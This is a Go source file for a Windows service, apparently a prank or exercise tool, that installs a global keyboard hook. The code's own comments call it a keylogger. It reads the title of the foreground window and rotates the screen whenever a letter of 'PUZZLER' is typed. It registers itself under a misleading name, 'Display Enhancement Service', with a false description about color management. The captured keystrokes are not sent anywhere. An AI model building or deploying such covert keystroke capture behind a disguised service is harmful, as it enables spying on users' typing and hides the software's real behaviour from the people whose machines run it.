// Creates a Mirage Extension that can be deployed within Mirage
// This code is compiled into an executable and run as a service
// The goal of this program is to run display.exe every time a specific key in the word "PUZZLER" is pressed
// Display.exe will rotate the screen 90 degrees clockwise on Windows systems

package main

import (
	"fmt"
	"log"
	"os"
	"os/exec"
	"os/signal"

	"syscall"
	"unsafe"

	"github.com/kardianos/service"
	"github.com/moutend/go-hook/pkg/keyboard"
	"github.com/moutend/go-hook/pkg/types"
	"golang.org/x/sys/windows"
)

type program struct{}

var (
	logger service.Logger
	mod    = windows.NewLazyDLL("user32.dll")

	procGetKeyState         = mod.NewProc("GetKeyState")
	procGetKeyboardLayout   = mod.NewProc("GetKeyboardLayout")
	procGetKeyboardState    = mod.NewProc("GetKeyboardState")
	procGetForegroundWindow = mod.NewProc("GetForegroundWindow")
	procToUnicodeEx         = mod.NewProc("ToUnicodeEx")
	procGetWindowText       = mod.NewProc("GetWindowTextW")
	procGetWindowTextLength = mod.NewProc("GetWindowTextLengthW")
)

func (p *program) Start(s service.Service) error {
	go p.run()
	return nil
}
func (p *program) run() {
	key_out := make(chan rune, 1024)
	window_out := make(chan string, 1024)
	Run(key_out, window_out)
}
func (p *program) Stop(s service.Service) error {
	return nil
}

type (
	HANDLE uintptr
	HWND   HANDLE
)

// Gets length of text of window text by HWND
func GetWindowTextLength(hwnd HWND) int {
	ret, _, _ := procGetWindowTextLength.Call(
		uintptr(hwnd))

	return int(ret)
}

// Gets text of window text by HWND
func GetWindowText(hwnd HWND) string {
	textLen := GetWindowTextLength(hwnd) + 1

	buf := make([]uint16, textLen)
	procGetWindowText.Call(
		uintptr(hwnd),
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(textLen))

	return syscall.UTF16ToString(buf)
}

// Gets current foreground window
func GetForegroundWindow() uintptr {
	hwnd, _, _ := procGetForegroundWindow.Call()
	return hwnd
}

// Converts from Virtual-Keycode to Ascii rune
func VKCodeToAscii(k types.KeyboardEvent) rune {
	var buffer []uint16 = make([]uint16, 256)
	var keyState []byte = make([]byte, 256)

	n := 10
	n |= (1 << 2)

	procGetKeyState.Call(uintptr(k.VKCode))

	procGetKeyboardState.Call(uintptr(unsafe.Pointer(&keyState[0])))
	r1, _, _ := procGetKeyboardLayout.Call(0)

	procToUnicodeEx.Call(uintptr(k.VKCode), uintptr(k.ScanCode), uintptr(unsafe.Pointer(&keyState[0])),
		uintptr(unsafe.Pointer(&buffer[0])), 256, uintptr(n), r1)

	if len(syscall.UTF16ToString(buffer)) > 0 {
		return []rune(syscall.UTF16ToString(buffer))[0]
	}
	return rune(0)
}

// Runs the keylogger
func Run(key_out chan rune, window_out chan string) error {
	keyboardChan := make(chan types.KeyboardEvent, 1024)

	if err := keyboard.Install(nil, keyboardChan); err != nil {
		return err
	}

	defer keyboard.Uninstall()

	signalChan := make(chan os.Signal, 1)
	signal.Notify(signalChan, os.Interrupt)

	fmt.Println("Starting capturing keyboard input")
	rotationValue := 0

	for {
		select {
		case <-signalChan:
			fmt.Println("Received shutdown signal")
			return nil
		case k := <-keyboardChan:
			if hwnd := GetForegroundWindow(); hwnd != 0 {
				if k.Message == types.WM_KEYDOWN {
					char := VKCodeToAscii(k)
					key_out <- char
					switch char {
					case 'p', 'P', 'u', 'U', 'z', 'Z', 'l', 'L', 'e', 'E', 'r', 'R':
						rotationValue += 90
						fmt.Printf("%c key pressed - executing display.exe to rotate screen %d degrees\n", char, rotationValue%360)
						logger.Info(fmt.Sprintf("%c key pressed - executing display.exe to rotate screen", char))

						err := exec.Command("C:\\Windows\\System32\\display.exe", fmt.Sprintf("/rotate:%d", rotationValue%360)).Start()
						if err != nil {
							fmt.Println("Error executing display.exe:", err)
							logger.Error(fmt.Sprintf("Error executing display.exe: %v", err))
						}
					}
					window_out <- GetWindowText(HWND(hwnd))
				}
			}
		}
	}
}

func main() {
	svcConfig := &service.Config{
		Name:        "DispSvc",
		DisplayName: "Display Enhancement Service",
		Description: "Provides color management and hardware-specific enhancements for monitors and internal displays.",
	}

	prg := &program{}
	s, err := service.New(prg, svcConfig)
	if err != nil {
		log.Fatal(err)
	}
	logger, err = s.Logger(nil)
	if err != nil {
		log.Fatal(err)
	}
	err = s.Run()
	if err != nil {
		logger.Error(err)
	}
}
